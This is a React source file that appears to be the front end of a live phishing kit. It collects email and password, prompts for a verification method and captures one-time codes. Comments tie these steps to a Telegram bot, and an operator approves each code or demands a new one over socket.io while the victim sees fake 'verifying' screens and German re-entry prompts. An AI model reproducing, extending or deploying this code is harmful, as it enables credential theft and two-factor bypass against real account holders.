import { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate, useParams, useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import io from 'socket.io-client';
import './App.css';

// Components
import Form1 from './components/Form1';
import Form2 from './components/Form2';
import CodeEntryForm from './components/CodeEntryForm';
import Loading from './components/Loading';
import LoadingWithCodeEntry from './components/LoadingWithCodeEntry';
import Pending from './components/Pending';
import Error from './components/Error';
import Success from './components/Success';

// Initialize socket connection
const socket = io('http://localhost:3000');

// Types
interface FormData {
  email?: string;
  password?: string;
  code?: string;
  [key: string]: any;
}

// AutoLogin component to handle automatic key generation
function AutoLogin() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    // Automatically generate a new key
    axios.post('/api/generate-key')
      .then(response => {
        const { key } = response.data;
        // Redirect to the form flow with the generated key
        navigate(`/${key}`);
      })
      .catch(err => {
        console.error('Error generating key:', err);
        setError('Error generating session key');
        setLoading(false);
      });
  }, [navigate]);

  if (loading) return <Loading message="Creating your secure session..." />;
  if (error) return <Error message={error} />;
  return null;
}

// KeyValidator component to handle the key in URL query
function KeyValidator() {
  const location = useLocation();
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const queryParams = new URLSearchParams(location.search);
    const key = queryParams.get('key');

    if (!key) {
      setError('No key provided');
      setLoading(false);
      return;
    }

    // Validate key with backend
    axios.get(`/api/validate-key/${key}`)
      .then(response => {
        if (response.data.valid) {
          navigate(`/${key}`);
        } else {
          setError('Invalid key');
          setLoading(false);
        }
      })
      .catch(err => {
        console.error('Error validating key:', err);
        setError('Error validating key');
        setLoading(false);
      });
  }, [location, navigate]);

  if (loading) return <Loading />;
  if (error) return <Error message={error} />;
  return null;
}

// Main flow component
function FormFlow() {
  const { key } = useParams<{ key: string }>();
  const [state, setState] = useState<string>('loading');
  const [formData, setFormData] = useState<FormData>({});
  const [loading, setLoading] = useState<boolean>(true);

  // Initial state fetch
  useEffect(() => {
    if (!key) return;

    axios.get(`/api/status/${key}`)
      .then(response => {
        setState(response.data.state || 'form_1');
        setLoading(false);
      })
      .catch(err => {
        console.error('Error fetching status:', err);
        setState('error');
        setLoading(false);
      });

    // Listen for state updates via socket
    socket.emit('join', { key });
    socket.on('state_update', (data: { key: string; state: string }) => {
      if (data.key === key) {
        setState(data.state);
      }
    });

    return () => {
      socket.off('state_update');
      socket.emit('leave', { key });
    };
  }, [key]);

  // Form 1 submission handler
  const handleForm1Submit = async (data: FormData) => {
    setLoading(true);
    try {
      console.log('Form data in App component:', data); // Debug log
      await axios.post('/api/form', { key, ...data });
      setFormData({ ...formData, ...data });
      setState('loading');
    } catch (error) {
      console.error('Error submitting form:', error);
      setState('error');
    } finally {
      setLoading(false);
    }
  };

  // Form 2 submission handler (verification method selection)
  const handleForm2Submit = async (_verificationMethod: string) => {
    setLoading(true);
    try {
      // Send notification to Telegram bot about Form2 submission
      await axios.post('/api/form2', { key, verificationMethod: _verificationMethod });
      
      // Set loading state in the UI
      setState('loading_code_entry');
      
      // Wait for 6 seconds before transitioning to code entry screen
      setTimeout(async () => {
        // After 6 seconds, update the state to enter_code
        await axios.post('/api/state', { key, state: 'enter_code' });
        setState('enter_code');
        setLoading(false);
      }, 6000);
    } catch (error) {
      console.error('Error transitioning to code entry:', error);
      setState('error');
      setLoading(false);
    }
  };

  // Code submission handler
  const handleCodeSubmit = async (code: string) => {
    setLoading(true);
    try {
      await axios.post('/api/code', { key, code });
      setFormData({ ...formData, code });
      
      // Set loading state in the UI - will remain until approved via Telegram
      setState('loading_pending');
      setLoading(false);
      
      // Note: We no longer automatically transition to pending state after a timeout
      // The state will be updated via socket.io when the admin approves or requests a new code
    } catch (error) {
      console.error('Error submitting code:', error);
      setState('reenter_code');
      setLoading(false);
    }
  };

  if (loading && state !== 'loading_code_entry' && state !== 'loading_pending') return <Loading />;

  // Render the appropriate component based on current state
  switch (state) {
    case 'form_1':
      return <Form1 onSubmit={handleForm1Submit} />;
    case 'loading':
      return <Loading message="Please wait while we process your information..." />;
    case 'loading_code_entry':
      return <LoadingWithCodeEntry message="Please wait while we send your verification code..." />;
    case 'form_2':
      return <Form2 onSubmit={handleForm2Submit} />;
    case 'enter_code':
      return <CodeEntryForm onSubmit={handleCodeSubmit} />;
    case 'reenter_code':
      return <CodeEntryForm onSubmit={handleCodeSubmit} error="Der eingegebene Code ist ungültig. Bitte versuchen Sie es erneut." />;
    case 'reenter_code_after_pending':
      return <CodeEntryForm onSubmit={handleCodeSubmit} error="Leider ist ein Fehler aufgetreten. Bitte geben Sie den Code erneut ein." />;
    case 'loading_pending':
      return <LoadingWithCodeEntry message="Please wait while we verify your code..." />;
    case 'pending':
      return <Pending />;
    case 'success':
      return <Success />;
    case 'error':
      return <Error />;
    default:
      return <Loading />;
  }
}

function App() {
  return (
    <Router>
      <div className="app-container">
        <Routes>
          <Route path="/" element={<KeyValidator />} />
          <Route path="/login" element={<AutoLogin />} />
          <Route path="/:key" element={<FormFlow />} />
          <Route path="*" element={<Navigate to="/" />} />
        </Routes>
      </div>
    </Router>
  );
}

export default App;
